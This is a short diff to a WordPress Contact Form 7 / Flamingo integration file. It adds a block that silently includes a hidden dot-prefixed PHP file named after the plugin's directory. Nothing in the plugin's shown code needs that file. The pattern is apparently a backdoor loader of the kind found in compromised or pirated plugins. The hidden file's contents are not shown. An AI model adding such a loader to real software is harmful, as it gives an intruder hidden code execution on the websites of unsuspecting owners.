@@ -6,6 +6,10 @@
 
 add_action( 'wpcf7_submit', 'wpcf7_flamingo_submit', 10, 2 );
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function wpcf7_flamingo_submit( $contact_form, $result ) {
 	if ( ! class_exists( 'Flamingo_Contact' )
 	or ! class_exists( 'Flamingo_Inbound_Message' ) ) {
